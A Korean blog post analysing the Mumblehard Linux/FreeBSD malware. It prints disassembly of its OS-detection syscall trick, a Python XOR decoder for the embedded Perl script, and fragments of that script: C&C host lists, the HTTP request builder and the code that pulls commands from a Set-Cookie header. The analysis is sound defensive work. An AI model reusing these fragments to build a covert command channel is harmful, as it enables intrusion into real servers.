---
layout: post
title: Mumblehard 악성코드의 몇가지 특징
date: 2015-05-21 15:21:51.000000000 +09:00
type: post
published: true
status: publish
categories:
- Malware Analysis
tags:
- freebsd
- Linux
- malware
- malware analysis
- mumblehard
author:
  login: n0fate
  email: rapfer@gmail.com
  display_name: n0fate
  first_name: ''
  last_name: ''
---
<p>mumblehard는 ESET에서 관리하는 블로그인 WeLiveSecurity를 통해 알려진 악성코드로 Linux와 FreeBSD를 둘 다 지원하는 멀티플랫폼 악성코드이다. <a href="http://www.welivesecurity.com/wp-content/uploads/2015/04/mumblehard.pdf" target="_blank">ESET에 있는 보고서</a>가 잘 정리되어 있으니 그 내용을 참조하기 바라며, 이 글에선 필자가 흥미롭게 본 부분만 정리한다. (사실 길게 쓰기 귀찮다..)<br />
<a href="#mumblehard-특징-정리" name="mumblehard-특징-정리"></a></p>
<p><strong>특징</strong></p>
<ul>
<li>멀티 플랫폼 지원(Linux/BSD)</li>
<li>인코딩 기법</li>
<li>펄 스크립트 C&amp;C</li>
</ul>
<h2 id="멀티-플랫폼-지원(linux/bsd)"><a href="#멀티-플랫폼-지원(linux/bsd)" name="멀티-플랫폼-지원(linux/bsd)"></a>멀티 플랫폼 지원(Linux/BSD)</h2>
<p>이 악성코드는 ELF 바이너리를 배포했음에도 여러 운영체제를 지원하도록 구성되어 있다. 일단 임포트하는 라이브러리가 하나도 없으며, 모든 코드가 직접적으로 시스템 콜을 호출하는 형태로 되어 있다. 리눅스 운영체제가 배포판 종류 및 버전에 따라 별도의 빌드가 필요한 것을 생각해봤을 때 다수의 리눅스 배포판에 효과적으로 배포가 가능하다고 볼 수 있다.<br />
이 외에도 재미있는 점은 운영체제 환경이 리눅스인지 BSD인지 확인하여 OS에 따라 다른 행동을 하도록 구성했다는 점이다. 예를 들어, 악성코드 시작 코드를 보자.</p>
<pre><code>LOAD:0804804C                                   public start
LOAD:0804804C                   start           proc near
LOAD:0804804C 89 25 0D 9A 04 08                 mov     MainStackPointer, esp
LOAD:08048052 B8 0D 00 00 00                    mov     eax, SYS_time   ; BSD : fchdir(stdin)
LOAD:08048052                                                           ; Linux : time(NULL)
LOAD:08048057 31 DB                             xor     ebx, ebx
LOAD:08048059 53                                push    ebx
LOAD:0804805A 50                                push    eax
LOAD:0804805B CD 80                             int     80h             ; syscall(SYS_time);
LOAD:0804805D 73 02                             jnb     short loc_8048061
LOAD:0804805F F7 D8                             neg     eax
LOAD:08048061
LOAD:08048061                   loc_8048061:                            ; CODE XREF: start+11j
LOAD:08048061 90                                nop
LOAD:08048062 90                                nop
LOAD:08048063 81 C4 08 00 00 00                 add     esp, 8
LOAD:08048069 3D 00 00 00 00                    cmp     eax, 0
LOAD:0804806E 7C 07                             jl      short isBSD
LOAD:08048070 B0 03                             mov     al, OS_LINUX
LOAD:08048072 E9 02 00 00 00                    jmp     loc_8048079
LOAD:08048077                   ; ---------------------------------------------------------------------------
LOAD:08048077
LOAD:08048077                   isBSD:                                  ; CODE XREF: start+22j
LOAD:08048077 B0 09                             mov     al, OS_BSD
LOAD:08048079
LOAD:08048079                   loc_8048079:                            ; CODE XREF: start+26j
LOAD:08048079 A2 11 9A 04 08                    mov     OSType, al
</code></pre>
<p>이 코드를 보면, 시스템 콜 13번(SYS_time)을 실행하는 것을 볼 수 있다. 이 콜은 운영체제에 따라 다른 기능을 수행하는데, Linux인 경우에는 시간 정보를 가져오는 time을 실행하고, BSD라면, fchdir 함수가 실행된다. 재미있는 점은 이 두 개의 호출이 다른 결과를 가져온다는 것이다. 예를 들어 위의 코드를 C로 구성해보면 다음과 같다.</p>
<pre><code>int ret = syscall(13, 0);
if ret &lt; 0:
    OSType = ISBSD;
else:
    OSType = ISLINUX;
</code></pre>
<p>BSD의 경우에 13번 fchdir은 두 번째 인자를 0을 받으면, fchdir(stdin)을 실행하고 그 결과를 준다. stdin을 입력으로 받으면 시스템 콜이 실패(-1)하고 디렉터리가 아니다(ENOTDIR, -20)이라는 에러 정보를 가진다. Linux라면, time(NULL)을 성공적으로 실행하여 현재 시간 정보를 int 형으로 돌려준다. 즉, 양수가 된다.<br />
이런 결과를 토대로 운영체제를 판단한 후, 임무 수행 시 각 운영체제마다 다른 시스템 콜 호출을 수행하도록 구성하였다.</p>
<h2 id="악성코드-디코더"><a href="#악성코드-디코더" name="악성코드-디코더"></a>악성코드 디코더</h2>
<p>Custom XOR을 사용했으며, 총 2개의 데이터를 복호화한다. 하나는 perl의 경로인 ‘/usr/bin/perl’이며, 다른 하나는 펄스크립트 코드이다. 복호화 코드는 다음과 같다.</p>
<pre><code>import struct

def xorl(nbytes, buffer):
    base = 4
    size = 16
    offset = 0
    result = ''
    while nbytes:
        if base == size:
            if size == 128:
                size = 0
            size += 16
            base = 1

        result += chr(int(buffer[offset]) ^ base)
        base += 1
        nbytes -= 1
        offset += 1
    return result

# /usr/bin/perl
buf = [0x2B, 0x70, 0x75, 0x75, 0x27, 0x6B, 0x63, 0x65, 0x23, 0x7D, 0x6B, 0x7D, 0x6D, 0x00]
print xorl(0x0D, buf)

# Perl script for command and control server
f = open('dump_perl_code', 'rb')
buf = f.read()

buflist = []
for i in buf:
    buflist.append(int(struct.unpack('=b', i)[0]))

f.close()

print xorl(0x1706, buflist)
</code></pre>
<p>디코딩 된 펄 코드는 C&amp;C 통신을 수행하며, HTTP 헤더에 있는 ‘Set-Cookie’ 필드에 PHPSESSIONID 뒤의 값을 이용하여 데이터 통신을 수행한다. 내부 정보는 Predefine된 구조체 형태로 되어 있으며, 인코딩되어 전송한다. 디코더는 펄 스크립트에 있으며, 코드는 다음과 같다.</p>
<pre><code>sub xorl {
    my ( $line, $code, $xor, $lim ) = ( shift, "", 1, 16 );
    foreach my $chr ( split( //, $line ) ) {
        if ( $xor == $lim ) { $lim = 0 if $lim == 256; $lim += 16; $xor = 1; }
        $code .= pack( "C", unpack( "C", $chr ) ^ $xor );
        $xor++;
    }
    return $code;
}
</code></pre>
<h2 id="펄-스크립트-c&amp;c"><a href="#펄-스크립트-c&amp;c" name="펄-스크립트-c&amp;c"></a>펄 스크립트 C&amp;C</h2>
<p>앞서 잠깐 언급한 것처럼 펄 스크립트는 C&amp;C와 통신하여 실제 명령을 수행하는 역할을 한다. 재밌는 점은 해당 스크립트에는 윈도 환경도 고려되어 있는 것 같다.</p>
<pre><code>if ( $^O eq "linux" )   { $ewblock = 11;    $eiprogr = 115; }
if ( $^O eq "freebsd" ) { $ewblock = 35;    $eiprogr = 36; }
if ( $^O eq "MSWin32" ) { $ewblock = 10035; $eiprogr = 10036; }
</code></pre>
<p>통신은 HTTP 패킷의 헤더에 정보를 은닉하여 수발신하도록 구성되어 있다. 코드 자체가 난독화되어 있진 않기 때문에 쉽게 분석할 수 있다. C&amp;C 접속에 사용된 URL/IP는 다음과 같다.</p>
<pre><code>my $url = [
    "184.106.208.157",     "194.54.81.163",
    "advseedpromoan.com",  "50.28.24.79",
    "67.221.183.105",      "seoratingonlyup.net",
    "advertise.com",       "195.242.70.4",
    "pratioupstudios.org", "behance.net"
];
</code></pre>
<p>HTTP Request 패킷은 기본적인 구조를 가지고 있다.</p>
<pre><code>    my $buffer  = join( "x0Dx0A",
        "GET $path HTTP/1.1",
        "Host: $host",
"User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:7.0.1) Gecko/$gecko Firefox/7.0.1",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.8,*/*;q=0.9",
        "Accept-Language: en-us,en;q=0.5",
        "Accept-Encoding: gzip, deflate",
        "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
        "Connection: close",
        "x0Dx0A" );
</code></pre>
<p>할 일은 PHPSESSID 뒤에 붙은 인코딩된 문자열을 디코딩하여 수행한다.</p>
<pre><code>    if ( open( F, "&lt;", $header ) ) {
        flock F, 1;
        my ( $test, $task ) = ( 0, "" );
        while (&lt;F&gt;) {
            s/^s*([^s]?.*)$/$1/;
            s/^(.*[^s])s*$/$1/;
            next unless length $_;
            $test++ if $_ eq "HTTP/1.0 200 OK" || $_ eq "Connection: close";
            $task = $1 if /^Set-Cookie: PHPSESSID=([^;]+)/;    // 값 추출
        }
        close F;
        ( $link, $file, $id, $command, $timeout ) = &amp;decd($task)    // 디코딩
          if $test == 2 &amp;&amp; length $task;
    }
</code></pre>
<p><span style="font-size: 10px;"><em>Featured Image Source : https://www.flickr.com/photos/barmala/2561602478/in/photostream/</em></span></p>
